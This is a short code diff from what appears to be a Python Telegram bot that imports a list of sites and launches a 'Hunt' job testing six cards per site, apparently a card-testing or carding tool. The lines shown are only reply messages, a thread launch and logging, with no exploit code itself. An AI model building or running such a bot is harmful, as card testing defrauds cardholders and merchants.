+                bot.reply_to(m, f"📥 <b>Imported {len(sites)} Sites</b>\n<i>Starting Hunt (6 cards per site)...</i>", parse_mode='HTML')
+                threading.Thread(target=run_main_job, args=(m, sites)).start()
+            else:
+                bot.reply_to(m, "⚠️ No valid sites found!")
+    
     except Exception as e:
         bot.reply_to(m, f"❌ <b>Error:</b> {str(e)}", parse_mode='HTML')
+        logger.error(f"File error: {e}")
 
 
 if __name__ == "__main__":
     start_keep_alive()
+    logger.info("🤖 Bot Started - v3 (6 CARD MULTI-TEST ENABLED)")
     bot.infinity_polling()
-
